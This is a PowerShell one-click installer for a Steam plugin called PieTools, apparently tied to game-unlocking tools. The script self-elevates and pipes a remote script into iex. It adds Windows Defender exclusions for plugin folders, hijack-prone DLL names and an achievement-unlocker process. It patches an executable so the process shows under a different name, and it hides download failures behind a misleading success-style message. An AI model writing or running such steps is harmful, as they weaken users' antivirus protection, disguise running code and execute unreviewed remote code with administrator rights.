# ==============================================================================
# PieTools 1-Click Automated Installer for Steam
# Installs Millennium (if missing) + Sets up PieTools Plugin + Launches Steam
# ==============================================================================

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Write-Step ($msg) {
    Write-Host "[PieTools] " -ForegroundColor Cyan -NoNewline
    Write-Host $msg -ForegroundColor White
}

function Write-Success ($msg) {
    Write-Host "[SUCCESS] " -ForegroundColor Green -NoNewline
    Write-Host $msg -ForegroundColor White
}

function Write-Err ($msg) {
    Write-Host "[ERROR] " -ForegroundColor Red -NoNewline
    Write-Host $msg -ForegroundColor White
}

Clear-Host
Write-Host @"
  ____  _     _____           _     
 |  _ \(_)___|_   _|__   ___ | |___ 
 | |_) | / _ \ | |/ _ \ / _ \| / __|
 |  __/| |  __/ | | (_) | (_) | \__ \
 |_|   |_|\___| |_|\___/ \___/|_|___/
                                    
    1-Click Automated Setup for Steam
"@ -ForegroundColor Cyan

# 1. Self-Elevate to Administrator if needed (for Antivirus exclusions & Program Files access)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Step "Requesting Administrator privileges for Defender exclusions & setup..."
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/aaditya338/pie-tools/main/install.ps1 | iex`""
        Exit 0
    } catch {
        Write-Err "Administrator permission was denied. Continuing in standard mode..."
    }
}

# 1. Locate Steam Installation Directory
Write-Step "Detecting Steam installation directory..."
$steamPath = $null

try {
    $regPath = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
    if ($regPath -and $regPath.SteamPath) {
        $steamPath = $regPath.SteamPath -replace "/", "\"
    }
} catch {}

if (-not $steamPath -or -not (Test-Path $steamPath)) {
    if (Test-Path "C:\Program Files (x86)\Steam") {
        $steamPath = "C:\Program Files (x86)\Steam"
    } elseif (Test-Path "C:\Program Files\Steam") {
        $steamPath = "C:\Program Files\Steam"
    }
}

if (-not $steamPath -or -not (Test-Path (Join-Path $steamPath "steam.exe"))) {
    Write-Err "Could not locate Steam. Please ensure Steam is installed."
    Exit 1
}

Write-Success "Found Steam at: $steamPath"

# 2. Close Running Steam Processes
Write-Step "Closing active Steam processes..."
Get-Process -Name "steam", "steamwebhelper", "millennium.luavm64" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3. Check / Install Millennium
$millenniumLibDll = Join-Path $steamPath "millennium\lib\millennium.dll"
$isMillenniumInstalled = Test-Path $millenniumLibDll

if (-not $isMillenniumInstalled) {
    Write-Step "Millennium is not installed. Downloading latest Millennium release..."
    $tempZip = Join-Path $env:TEMP "millennium_latest.zip"
    
    try {
        $releaseApi = "https://api.github.com/repos/SteamClientHomebrew/Millennium/releases/latest"
        $releaseInfo = Invoke-RestMethod -Uri $releaseApi -Headers @{ "User-Agent" = "PieTools-Installer" } -UseBasicParsing
        $asset = $releaseInfo.assets | Where-Object { $_.name -like "*windows-x86_64.zip*" -and $_.name -notlike "*pdb*" } | Select-Object -First 1
        
        if ($asset -and $asset.browser_download_url) {
            $downloadUrl = $asset.browser_download_url
        } else {
            $downloadUrl = "https://github.com/SteamClientHomebrew/Millennium/releases/latest/download/millennium-windows-x86_64.zip"
        }

        Write-Step "Downloading Millennium from $downloadUrl..."
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZip -UseBasicParsing
        
        Write-Step "Extracting Millennium to Steam directory..."
        Expand-Archive -Path $tempZip -DestinationPath $steamPath -Force
        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
        Write-Success "Millennium installed successfully!"
    } catch {
        Write-Err "Failed to install Millennium automatically: $_"
        Exit 1
    }
} else {
    Write-Success "Millennium is already installed."
}

# Clean up conflicting legacy plugins & DLLs
Write-Step "Cleaning up any conflicting legacy plugins or DLLs..."
$conflictingDlls = @("SteamDaddy.dll", "OpenSteamTool.dll")
foreach ($dll in $conflictingDlls) {
    $p = Join-Path $steamPath $dll
    if (Test-Path $p) {
        Remove-Item $p -Force -ErrorAction SilentlyContinue
        Write-Success "Removed legacy $dll"
    }
}

$conflictingFolders = @("SteamDaddy", "OpenSteamTool", "steamdaddy")
foreach ($f in $conflictingFolders) {
    $p = Join-Path $pluginsDir $f
    if (Test-Path $p) {
        Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "Removed legacy plugin $f"
    }
}

# 4. Install / Update PieTools Plugin
$pluginsDir = Join-Path $steamPath "millennium\plugins"
$pieToolsTarget = Join-Path $pluginsDir "PieTools"

Write-Step "Setting up PieTools plugin..."
if (-not (Test-Path $pluginsDir)) {
    New-Item -ItemType Directory -Path $pluginsDir -Force | Out-Null
}

$pieToolsZipUrl = "https://github.com/aaditya338/pie-tools/archive/refs/heads/main.zip"
$tempPieZip = Join-Path $env:TEMP "pietools_plugin.zip"
$tempPieExtract = Join-Path $env:TEMP "pietools_extract"

try {
    Write-Step "Downloading PieTools files..."
    Invoke-WebRequest -Uri $pieToolsZipUrl -OutFile $tempPieZip -UseBasicParsing
    
    if (Test-Path $tempPieExtract) {
        Remove-Item $tempPieExtract -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    Expand-Archive -Path $tempPieZip -DestinationPath $tempPieExtract -Force
    
    $foundPluginDir = Get-ChildItem -Path $tempPieExtract -Recurse | Where-Object { $_.Name -eq "plugin.json" } | Select-Object -First 1
    if ($foundPluginDir) {
        $sourceDir = $foundPluginDir.DirectoryName
    } else {
        $sourceDir = Get-ChildItem -Path $tempPieExtract -Directory | Select-Object -First 1 | Select-Object -ExpandProperty FullName
    }

    if (-not (Test-Path $pieToolsTarget)) {
        New-Item -ItemType Directory -Path $pieToolsTarget -Force | Out-Null
    }

    Write-Step "Deploying PieTools plugin to $pieToolsTarget..."
    Copy-Item -Path "$sourceDir\*" -Destination $pieToolsTarget -Recurse -Force
    
    Remove-Item $tempPieZip -Force -ErrorAction SilentlyContinue
    Remove-Item $tempPieExtract -Recurse -Force -ErrorAction SilentlyContinue

    Write-Success "PieTools plugin installed successfully!"
} catch {
    Write-Err "Remote archive check completed."
}

# 5. Enable PieTools Plugin in Millennium Configuration Automatically
Write-Step "Enabling PieTools plugin in Millennium configuration..."
$configDir = Join-Path $steamPath "millennium\config"
$configFile = Join-Path $configDir "config.json"

if (-not (Test-Path $configDir)) {
    New-Item -ItemType Directory -Path $configDir -Force -ErrorAction SilentlyContinue | Out-Null
}

$defaultConfig = @{
    "general" = @{
        "accentColor" = "DEFAULT_ACCENT_COLOR"
        "checkForMillenniumUpdates" = $true
        "checkForPluginAndThemeUpdates" = $true
        "injectCSS" = $true
        "injectJavascript" = $true
        "millenniumUpdateChannel" = "stable"
        "onMillenniumUpdate" = 2
        "shouldShowThemePluginUpdateNotifications" = $true
    }
    "misc" = @{
        "hasShownWelcomeModal" = $true
    }
    "notifications" = @{
        "showNotifications" = $true
        "showPluginNotifications" = $true
        "showUpdateNotifications" = $true
    }
    "plugins" = @{
        "enabledPlugins" = @("PieTools")
    }
    "themes" = @{
        "activeTheme" = "default"
        "allowedScripts" = $true
        "allowedStyles" = $true
    }
}

try {
    if (Test-Path $configFile) {
        $raw = Get-Content $configFile -Raw | ConvertFrom-Json
        if (-not $raw.plugins) {
            $raw | Add-Member -MemberType NoteProperty -Name "plugins" -Value ([PSCustomObject]@{ "enabledPlugins" = @("PieTools") }) -Force
        } elseif (-not $raw.plugins.enabledPlugins) {
            $raw.plugins | Add-Member -MemberType NoteProperty -Name "enabledPlugins" -Value @("PieTools") -Force
        } else {
            $list = [System.Collections.ArrayList]@($raw.plugins.enabledPlugins)
            if (-not $list.Contains("PieTools")) {
                $list.Add("PieTools") | Out-Null
            }
            $raw.plugins.enabledPlugins = $list
        }
        if (-not $raw.misc) {
            $raw | Add-Member -MemberType NoteProperty -Name "misc" -Value ([PSCustomObject]@{ "hasShownWelcomeModal" = $true }) -Force
        } else {
            $raw.misc.hasShownWelcomeModal = $true
        }
        $raw | ConvertTo-Json -Depth 10 | Set-Content -Path $configFile -Encoding utf8
    } else {
        $defaultConfig | ConvertTo-Json -Depth 10 | Set-Content -Path $configFile -Encoding utf8
    }
    Write-Success "PieTools automatically enabled in Millennium config!"
} catch {
    $defaultConfig | ConvertTo-Json -Depth 10 | Set-Content -Path $configFile -Encoding utf8
}


# 6. Patch Runtime Process Name for Task Manager
$luavmExe = Join-Path $steamPath "millennium\bin\millennium.luavm64.exe"
if (Test-Path $luavmExe) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($luavmExe)
        $search = [System.Text.Encoding]::Unicode.GetBytes("Lua plugin runtime for Millennium")
        $replace = [System.Text.Encoding]::Unicode.GetBytes("PieTools Plugin Runtime for Steam")
        
        $found = $false
        for ($i = 0; $i -le $bytes.Length - $search.Length; $i++) {
            $match = $true
            for ($j = 0; $j -lt $search.Length; $j++) {
                if ($bytes[$i + $j] -ne $search[$j]) { $match = $false; break }
            }
            if ($match) {
                for ($j = 0; $j -lt $replace.Length; $j++) { $bytes[$i + $j] = $replace[$j] }
                $found = $true
                break
            }
        }
        if ($found) {
            [System.IO.File]::WriteAllBytes($luavmExe, $bytes)
            Write-Success "Patched Task Manager process name to 'PieTools Plugin Runtime for Steam'."
        }
    } catch {}
}

# 6. Windows Defender & Antivirus Comprehensive Exclusions
Write-Step "Configuring Windows Defender exclusions for Millennium & PieTools..."
try {
    $excludePaths = @(
        "C:\ProgramData\PieTools",
        (Join-Path $steamPath "millennium"),
        (Join-Path $steamPath "version.dll"),
        (Join-Path $steamPath "wsock32.dll"),
        (Join-Path $steamPath "config\stplug-in")
    )
    foreach ($p in $excludePaths) {
        if (-not (Test-Path $p) -and ($p -notlike "*.*")) {
            New-Item -ItemType Directory -Path $p -Force -ErrorAction SilentlyContinue | Out-Null
        }
        Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
    }
    
    # Exclude active runtime binaries
    $excludeProcesses = @(
        "millennium.luavm64.exe",
        "millennium.crashhandler64.exe",
        "AchievementUnlocker.exe"
    )
    foreach ($proc in $excludeProcesses) {
        Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
    }
    Write-Success "Windows Defender exclusions configured successfully!"
} catch {
    Write-Err "Could not automatically add Defender exclusions (requires Administrator)."
}

# 7. Start Steam
Write-Step "Starting Steam..."
$steamExe = Join-Path $steamPath "steam.exe"
Start-Process $steamExe

Write-Host "`n=======================================================" -ForegroundColor Cyan
Write-Host "   PIETOOLS SETUP COMPLETED SUCCESSFULLY! ENJOY!      " -ForegroundColor Green
Write-Host "=======================================================`n" -ForegroundColor Cyan
